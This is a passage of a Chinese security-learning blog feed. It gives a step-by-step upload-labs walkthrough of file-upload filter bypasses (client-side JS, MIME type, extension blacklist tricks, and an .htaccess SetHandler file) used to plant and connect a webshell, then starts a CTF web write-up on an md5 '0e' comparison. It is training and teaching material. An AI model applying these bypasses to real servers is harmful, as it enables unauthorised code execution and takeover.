alt="在这里插入图片描述"><br><strong>下面的绕过类型都是通过的upload-labs漏洞环境来实现</strong></p><h4 id="二、JS限制文件上传"><a href="#二、JS限制文件上传" class="headerlink" title="二、JS限制文件上传"></a>二、JS限制文件上传</h4><h5 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h5><p><img src="http://img-blog.csdnimg.cn/20190731121558760.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>直接上传webshell，发现上传失败，只能上传后缀为<code>.jpg|.png|.gif</code>的文件。<br>查看源码</p><pre><code class="js">function checkFile() {    var file = document.getElementsByName(&#39;upload_file&#39;)[0].value;    if (file == null || file == &quot;&quot;) {        alert(&quot;请选择要上传的文件!&quot;);        return false;    }    //定义允许上传的文件类型    var allow_ext = &quot;.jpg|.png|.gif&quot;;    //提取上传文件的类型    var ext_name = file.substring(file.lastIndexOf(&quot;.&quot;));    //判断上传文件类型是否允许上传    if (allow_ext.indexOf(ext_name + &quot;|&quot;) == -1) {        var errMsg = &quot;该文件不允许上传，请上传&quot; + allow_ext + &quot;类型的文件,当前文件类型为：&quot; + ext_name;        alert(errMsg);        return false;    }}</code></pre><p>在客户端使用JS对不合法图片进行检查。所以绕过客户端JS检测，上传webshell<br><strong>客户端JS检测</strong><br>JS检测绕过上传漏洞，如果上传后缀不被允许，则会弹窗告知。<br>上传文件的数据包没有发到服务端，只在客户端使用JavaScript对数据包进行检测。<br><strong>绕过客户端JS检测的三种方法</strong></p><ul><li>使用浏览器插件。删除检测文件后缀的JS代码，然后上传webshell</li><li>首先把webshell的后缀改成允许上传的<code>.jpg|.png|.gif</code>，绕过JS检测。再抓包，把后缀名改成<code>.php</code>,即可上传webshell</li><li>在前端js判断函数中加上可以上传php文件</li></ul><p>尝试第二种，先把webshell的后缀<code>.php</code>改为<code>.jpg</code><br><img src="http://img-blog.csdnimg.cn/20190731131712291.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后上传，抓包修改后缀为<code>.php</code><br><img src="http://img-blog.csdnimg.cn/20190731131722558.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>Forward发包，上传成功<br><img src="http://img-blog.csdnimg.cn/20190731131925859.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>测试连接，连接成功<br><img src="http://img-blog.csdnimg.cn/20190731132353518.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>注意：测试完后删除webshell.php，因为后边我使用的都是同一个webshell(不是同一个，就不用删除)</strong></p><h4 id="二、MIME限制文件上传"><a href="#二、MIME限制文件上传" class="headerlink" title="二、MIME限制文件上传"></a>二、MIME限制文件上传</h4><h5 id="Pass-02"><a href="#Pass-02" class="headerlink" title="Pass-02"></a>Pass-02</h5><p><img src="http://img-blog.csdnimg.cn/20190731143705573.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>直接上传webshell，发现上传失败，文件类型不正确。<br>查看源码</p><pre><code class="php">$is_upload = false;$msg = null;if (isset($_POST[&#39;submit&#39;])) {    if (file_exists(UPLOAD_PATH)) {        if (($_FILES[&#39;upload_file&#39;][&#39;type&#39;] == &#39;image/jpeg&#39;) || ($_FILES[&#39;upload_file&#39;][&#39;type&#39;] == &#39;image/png&#39;) || ($_FILES[&#39;upload_file&#39;][&#39;type&#39;] == &#39;image/gif&#39;)) {            $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];            $img_path = UPLOAD_PATH . &#39;/&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;]                        if (move_uploaded_file($temp_file, $img_path)) {                $is_upload = true;            } else {                $msg = &#39;上传出错！&#39;;            }        } else {            $msg = &#39;文件类型不正确，请重新上传！&#39;;        }    } else {        $msg = UPLOAD_PATH.&#39;文件夹不存在,请手工创建！&#39;;    }}</code></pre><p>在服务端对数据包的MIME进行检查。所以绕过文件类型，上传webshell<br><strong>MIME</strong><br>MIME(Multipurpose Internet Mail Extensions)多用途互联网邮件扩展类型。是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。多用于指定一些客户端自定义的文件名，以及一些媒体文件打开方式。<br><strong>绕过服务端对数据包的MIME进行检查</strong><br>在客户端上传文件，通过BurpSuite抓包。</p><ul><li>上传php文件时，Content-Type的值是<code>application/octet-stream</code>；</li><li>上传jpg文件时，Content-Type的值是<code>image/jpeg</code></li><li>如果服务器通过Content-Type的值判断文件类型，上传php文件(webshell)时，将Content-Type的值修改为<code>image/jpeg</code>，即可上传php文件(webshell)。</li></ul><p>所以上传webshell.php，抓包修改Content-Type的值为<code>image/jpeg</code><br><img src="http://img-blog.csdnimg.cn/20190731142547505.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>Forward发包，上传成功<br><img src="http://img-blog.csdnimg.cn/20190731170904886.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>测试连接，连接成功<br><img src="http://img-blog.csdnimg.cn/20190731142914305.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h4 id="三、黑名单限制文件上传"><a href="#三、黑名单限制文件上传" class="headerlink" title="三、黑名单限制文件上传"></a>三、黑名单限制文件上传</h4><p><strong>Apache解析</strong></p><ul><li>有些Apache允许解析其他文件后缀。如在http.conf中，若配置有如下代码，则能解析php和phtml文件<pre><code class="php">AddType application/x-httpd-php .php .phtml</code></pre></li><li>Apache的解析顺序是从右到左开始解析文件后缀的，如果最右侧扩展名不可识别，就继续往左判断。直到遇到可以解析的文件后缀为止<br><strong>htaccess</strong><br>htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。<br><strong>绕过文件后缀的方法</strong><ol><li>上传一个后缀为phtml的webshell</li><li>上传文件名类似1.php.xxxx，因为后缀xxxx不可以解析，所以向左解析后缀<code>.php</code></li><li>构造.htaccess，实现重写文件解析。</li><li>大小写绕过</li><li>双写绕过</li><li>在后缀名中加空绕过</li><li>在后缀名中加”.”绕过</li><li>等等</li></ol></li></ul><h5 id="Pass-03-上传webshell-phtml绕过"><a href="#Pass-03-上传webshell-phtml绕过" class="headerlink" title="Pass-03(上传webshell.phtml绕过)"></a>Pass-03(上传webshell.phtml绕过)</h5><p><img src="http://img-blog.csdnimg.cn/20190731143726505.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt></p><p>直接上传webshell，发现上传失败。<br>查看源码</p><pre><code class="php">$is_upload = false;$msg = null;if (isset($_POST[&#39;submit&#39;])) {    if (file_exists(UPLOAD_PATH)) {        $deny_ext = array(&#39;.asp&#39;,&#39;.aspx&#39;,&#39;.php&#39;,&#39;.jsp&#39;);        $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);        $file_name = deldot($file_name);//删除文件名末尾的点        $file_ext = strrchr($file_name, &#39;.&#39;);        $file_ext = strtolower($file_ext); //转换为小写        $file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA        $file_ext = trim($file_ext); //收尾去空        if(!in_array($file_ext, $deny_ext)) {            $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];            $img_path = UPLOAD_PATH.&#39;/&#39;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;                        if (move_uploaded_file($temp_file,$img_path)) {                 $is_upload = true;            } else {                $msg = &#39;上传出错！&#39;;            }        } else {            $msg = &#39;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#39;;        }    } else {        $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;;    }}</code></pre><p>黑名单判断，不允许上传<code>.asp|.aspx|.php|.jsp</code>后缀文件。<br>尝试第一种方法，上传webshell.phtml<br><img src="http://img-blog.csdnimg.cn/20190731170747716.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>上传成功，测试连接，连接失败。。</p><p>参考大佬博客，发现没有配置添加如下代码：</p><pre><code class="php">AddType application/x-httpd-php .php .phtml</code></pre><p>配置方法参照：<br><a href="https://www.cnblogs.com/tradoff/p/5854965.html" target="_blank" rel="noopener">ubuntu下apache与php配置</a><br>好了，我已经配置完毕，删除之前的文件，再上传一次。测试连接，连接失败。。emmmmm。。。。<br>查看上传的文件<br><img src="http://img-blog.csdnimg.cn/20190731184659531.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发现文件名被替换了。所以连接时文件名换一下，连接成功<br><img src="http://img-blog.csdnimg.cn/20190731184840187.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h5 id="Pass-04-重写文件解析绕过"><a href="#Pass-04-重写文件解析绕过" class="headerlink" title="Pass-04(重写文件解析绕过)"></a>Pass-04(重写文件解析绕过)</h5><p>查看源码</p><pre><code class="php">$is_upload = false;$msg = null;if (isset($_POST[&#39;submit&#39;])) {    if (file_exists(UPLOAD_PATH)) {        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;php1&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;pHp1&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;);        $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);        $file_name = deldot($file_name);//删除文件名末尾的点        $file_ext = strrchr($file_name, &#39;.&#39;);        $file_ext = strtolower($file_ext); //转换为小写        $file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA        $file_ext = trim($file_ext); //收尾去空        if (!in_array($file_ext, $deny_ext)) {            $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];            $img_path = UPLOAD_PATH.&#39;/&#39;.$file_name;            if (move_uploaded_file($temp_file, $img_path)) {                $is_upload = true;            } else {                $msg = &#39;上传出错！&#39;;            }        } else {            $msg = &#39;此文件不允许上传!&#39;;        }    } else {        $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;;    }}</code></pre><p>黑名单判断，不允许上传后缀文件为</p><pre><code>.php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1|.Html|.Htm|.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml|.asp|.aspx|.asa|.asax|.ascx|.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx|.cEr|.sWf|.swf</code></pre><p>这样Pass-03的方法就没办法使用了。所以尝试使用方法3，构造.htaccess，实现重写文件解析。<br>同样这样的前提也是得在配置文件里面有这样的一句话</p><pre><code class="php">AllowOverride AllLoadModule rewrite_module modules/mod_rewrite.so</code></pre><p>因为我的配置文件没有，所以配置一下。<br>参考博客：<br><a href="https://www.cnblogs.com/li-mei/p/5959217.html" target="_blank" rel="noopener">apache开启rewrite重写</a><br><a href="https://www.jianshu.com/p/5a4e4c0904f5" target="_blank" rel="noopener">.htaccess攻击</a><br>配置完毕。把<code>SetHandler application/x-httpd-php</code> 这句话写成<code>.htaccess</code>，然后上传个jpg，它就当php解析了。<br><code>.htaccess</code>文件内容为：</p><pre><code class="php">&lt;FilesMatch &quot;webshell&quot;&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt;</code></pre><p>先上传<code>.htaccess</code>文件，然后上传<code>webshell.jpg</code><br>上传成功，测试连接，连接成功<br><img src="http://img-blog.csdnimg.cn/20190731212035842.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h5 id="Pass-05-大小写绕过"><a href="#Pass-05-大小写绕过" class="headerlink" title="Pass-05(大小写绕过)"></a>Pass-05(大小写绕过)</h5><p>查看源码发现，与<strong>Pass-04</strong>相比，多了不允许上传后缀文件<code>.htaccess</code>，但是没有将后缀进行大小写统一，于是可以通过大小写绕过。<br>上传<code>webshell.phP</code>，上传成功。测试连接，连接失败。查看文件，发现文件名被替换<br><img src="http://img-blog.csdnimg.cn/20190731213655205.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>重新输入文件名，测试连接，连接成功</p><p><img src="http://img-blog.csdnimg.cn/20190731213917525.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h5 id="Pass-06-加空格绕过"><a href="#Pass-06-加空格绕过" class="headerlink" title="Pass-06(加空格绕过)"></a>Pass-06(加空格绕过)</h5><p>查看源码发现还是黑名单，但是没有对后缀名进行去空处理，可在后缀名中加空绕过。<br>上传<code>webshell.php</code>，抓包，加空格<br><img src="http://img-blog.csdnimg.cn/20190731220305660.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>上传成功。查看上传的文件名<br><img src="http://img-blog.csdnimg.cn/20190731220318955.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>测试连接，连接成功<br><img src="http://img-blog.csdnimg.cn/20190731220327231.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h5 id="Pass-07-加-绕过"><a href="#Pass-07-加-绕过" class="headerlink" title="Pass-07(加.绕过)"></a>Pass-07(加<code>.</code>绕过)</h5><p>还是黑名单，禁止上传所有可以解析的后缀。<br>但是没有对后缀名进行去”<code>.</code>”处理，利用windows特性，会自动去掉后缀名中最后的”<code>.</code>”，可在后缀名中加”.”绕过。<br>上传<code>webshell.php</code>，抓包，加<code>.</code><br><img src="http://img-blog.csdnimg.cn/20190731221515445.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>上传成功。测试连接，连接成功<br><img src="http://img-blog.csdnimg.cn/20190731221502638.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h5 id="Pass-08-加-DATA绕过"><a href="#Pass-08-加-DATA绕过" class="headerlink" title="Pass-08(加::$DATA绕过)"></a>Pass-08(加<code>::$DATA</code>绕过)</h5><p>还是黑名单，但是没有对后缀名进行去”<code>::$DATA</code>”处理，利用windows特性，可在后缀名中加” <code>::$DATA</code>”绕过。<br>上传<code>webshell.php</code>，抓包，加<code>::$DATA</code><br><img src="http://img-blog.csdnimg.cn/20190731221940929.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>上传成功。测试连接，连接失败。因为我用的ubantu，所以用Windows执行上述操作就ok了，就不叙述了。</p><h5 id="Pass-09-点-空格-点绕过"><a href="#Pass-09-点-空格-点绕过" class="headerlink" title="Pass-09(点+空格+点绕过)"></a>Pass-09(点+空格+点绕过)</h5><p>查看源码</p><pre><code class="php">$is_upload = false;$msg = null;if (isset($_POST[&#39;submit&#39;])) {    if (file_exists(UPLOAD_PATH)) {        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);        $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);        $file_name = deldot($file_name);//删除文件名末尾的点        $file_ext = strrchr($file_name, &#39;.&#39;);        $file_ext = strtolower($file_ext); //转换为小写        $file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA        $file_ext = trim($file_ext); //首尾去空        if (!in_array($file_ext, $deny_ext)) {            $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];            $img_path = UPLOAD_PATH.&#39;/&#39;.$file_name;            if (move_uploaded_file($temp_file, $img_path)) {                $is_upload = true;            } else {                $msg = &#39;上传出错！&#39;;            }        } else {            $msg = &#39;此文件类型不允许上传！&#39;;        }    } else {        $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;;    }}</code></pre><p>还是黑名单，但是第15行和之前不太一样，路径拼接的是处理后的文件名。<br>str_replace先删除一个点，再删除一个空格。<br>点+空格+点，经过处理后，文件名变成<code>webshell.php.</code>，即可绕过。<br><img src="http://img-blog.csdnimg.cn/20190731223556730.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>上传成功。测试连接，连接成功<br><img src="http://img-blog.csdnimg.cn/20190731223741539.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h5 id="Pass-10-双写绕过"><a href="#Pass-10-双写绕过" class="headerlink" title="Pass-10(双写绕过)"></a>Pass-10(双写绕过)</h5><p>查看源码发现关键代码</p><pre><code class="php">$file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);//定义name$file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);//替换上面的php这些为空</code></pre><p>将问题后缀名替换为空，于是可以利用双写绕过。<br>上传<code>webshell.php</code>，抓包，双写<br><img src="http://img-blog.csdnimg.cn/20190731224404268.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>上传成功。测试连接，连接成功<br><img src="http://img-blog.csdnimg.cn/2019073122444713.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>好了，就先总结这么多，剩下的另一篇《文件上传漏洞 学习笔记(二)》进行总结。</p><h3 id="感悟"><a href="#感悟" class="headerlink" title="感悟"></a>感悟</h3><p>文件上传漏洞总结之后，对文件上传漏洞理解了很多，也收获了很多。<br>继续努力学习。小白进阶ing</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞原理 </category>
          
          <category> 文件上传漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JS绕过 </tag>
            
            <tag> MIME绕过 </tag>
            
            <tag> 黑名单绕过 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>南邮-Web(一)</title>
      <link href="/2019/07/25/%E5%8D%97%E9%82%AE-Web(%E4%B8%80)/"/>
      <url>/2019/07/25/%E5%8D%97%E9%82%AE-Web(%E4%B8%80)/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>最近做了些南邮的Web题，虽然有些比较基础，但依旧可以学到一些Web知识。</p><h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><h4 id="Web1：签到题"><a href="#Web1：签到题" class="headerlink" title="Web1：签到题"></a>Web1：签到题</h4><p>题比较基础，查看源码即可<br><img src="http://img-blog.csdnimg.cn/2019072513394642.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h4 id="Web2：md5-collision"><a href="#Web2：md5-collision" class="headerlink" title="Web2：md5 collision"></a>Web2：md5 collision</h4><p><img src="http://img-blog.csdnimg.cn/20190725134135426.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>审计题目的代码可知：</p><ol><li>字符串QNKCDZO进行md5，得到md5值0e830400451993494058024219903391并赋值给变量<code>$md51</code>。</li><li>GET请求获取提交a的值并赋值给变量<code>$a</code>，并对<code>$a</code>进行md5操作赋值给<code>$md52</code>。</li><li>若变量<code>$a</code>不为空，且不等于’QNKCDZO’，并<code>$md51</code>与<code>$md52</code>的值内容相等，则可以得到 flag。</li><li>由于<code>$md51</code>为0e830400451993494058024219903391，在==比较时，会被认为是0*10^830400451993494058024219903391，也就是0。</li><li>那满足条件的变量<code>$a</code>就是其md5值是0e开头的即可<br>找一个md5加密后为0的值：s878926199a<br>更多请点击-&gt;<a href="https://blog.csdn.net/qq_41281571/article/details/81292786" target="_blank" rel="noopener">MD5加密后==’0’ </a><br>由于是GET请求获取变量<code>$a</code>，构造参数flag显现</li></ol><p><img src="http://i1.fuimg.com/690374/48ebc76d693e08a6.jpg" alt="Markdown"></p><h4 id="Web3：签到2"><a href="#Web3：签到2" class="headerlink" title="Web3：签到2"></a>Web3：签到2</h4><p><img src="http://i1.fuimg.com/690374/99090e6d48efd561.jpg" alt="Markdown"></p><p>很明显，口令有11位，输入框只能输10位，增大输入框长度即可。输入口令得到flag<br><img src="http://i1.fuimg.com/690374/0626c12b201c384d.jpg" alt="在这里插入图片描述"></p><h4 id="Web4：这题不是WEB"><a href="#Web4：这题不是WEB" class="headerlink" title="Web4：这题不是WEB"></a>Web4：这题不是WEB</h4><p><img src="http://img-blog.csdnimg.cn/20190725140132506.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>看题目提示，可能此题不是Web题。。。点开题目地址<br><img src="http://img-blog.csdnimg.cn/20190725140220364.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>分析发现就这张图片比较可疑，保存图片，看是不是图片隐写。先用WinHex打开<br><img src="http://img-blog.csdnimg.cn/20190725140439342.jpg" alt="在这里插入图片描述"><br>果然这题不是WEB，是图片隐写</p><h4 id="Web5：层层递进"><a href="#Web5：层层递进" class="headerlink" title="Web5：层层递进"></a>Web5：层层递进</h4><p>题目描述没有提示，点击题目地址<br><img src="http://img-blog.csdnimg.cn/20190725141010939.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>没有有用信息，查看网页源码<br><img src="http://img-blog.csdnimg.cn/20190725141105106.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发现有个<code>SO.html</code>,输入到url地址栏，并查看源码<br><img src="http://img-blog.csdnimg.cn/20190725141255923.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发现有个<code>S0.html</code>，输入到url地址栏，并查看源码<br><img src="http://img-blog.csdnimg.cn/20190725141444700.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" 